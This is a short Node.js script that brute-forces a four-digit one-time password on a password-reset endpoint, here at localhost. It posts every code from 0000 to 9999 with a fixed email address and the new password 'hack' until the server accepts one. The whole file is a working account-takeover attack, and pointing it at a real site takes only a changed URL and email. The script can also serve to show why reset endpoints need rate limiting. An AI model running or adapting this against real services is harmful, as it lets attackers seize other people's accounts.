const axios = require('axios');

// Function to send a single request
async function sendRequest(otp) {
    const data = JSON.stringify({
        "email": "angad@gmail.com",
        "otp": otp,
        "newPassword": "hack"
    });

    const config = {
        method: 'post',
        url: 'http://localhost:3000/reset-password',
        headers: { 
            'Content-Type': 'application/json'
        },
        data
    };

    try {
        const response = await axios.request(config);

        // If the correct OTP is guessed
        if (response.status === 200) {
            console.log(`Correct OTP: ${otp}`);
            return true;
        }
    } catch (error) {
        // Handle error, such as invalid OTP or other issues
        return false;
    }

    return false;
}

// Main function to loop through all 4-digit OTPs
async function main() {
    for (let i = 0; i < 10000; i++) {
        const otp = i.toString().padStart(4, '0');  // Format as 4-digit OTP

        console.log(`${otp}`);

        if (await sendRequest(otp)) {
            break;  // Stop once the correct OTP is found
        }
    }
}

main();
